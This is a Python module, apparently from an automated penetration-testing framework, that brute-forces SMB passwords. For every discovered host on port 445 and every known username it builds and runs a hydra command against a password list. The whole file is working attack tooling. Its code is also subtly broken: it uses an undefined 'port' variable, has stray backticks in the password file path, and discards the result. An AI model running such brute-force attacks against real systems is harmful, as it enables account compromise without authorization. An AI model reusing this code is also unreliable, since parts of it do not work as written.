from core.actionModule import actionModule
from core.keystore import KeyStore as kb
from core.utils import Utils


class hydrasmbpassword(actionModule):
    def __init__(self, config, display, lock):
        super(hydrasmbpassword, self).__init__(config, display, lock)
        self.title = "Attempt to bruteforce SMB passwords"
        self.shortName = "HydraSMBPassword"
        self.description = "execute [hydra -s 445 -L users -P passwords -o ttt smb://<server>] on each username"

        self.requirements = ["hydra"]
        self.triggers = ["newServicesmb", "newPort445"]

        self.safeLevel = 2

    def getTargets(self):
        self.targets = kb.get(['service/smb/host', 'host/*/tcpport/445'])

    def process(self):
        # load any targets we are interested in
        self.getTargets()

        # loop over each target
        for t in self.targets:
            users = kb.get(['host/*/user'])
            self.display.verbose(self.shortName + " - Connecting to " + t)
            for user in users:
                # verify we have not tested this host before
                if not self.seentarget(t + str(user)):
                    # add the new IP to the already seen list
                    self.addseentarget(t + str(user))
                    # make outfile
                    temp_file = self.config["proofsDir"] + self.shortName + "_" + t + "_" + str(
                        port) + "_" + Utils.getRandStr(10)

                    command = "hydra -s 445 -l " + user + " -P " + self.config[
                        "miscDir"] + "passwords```.txt smb://" + t
                    result = Utils.execWait(command, temp_file, timeout=30)

                    # TODO
                    # print result
        return
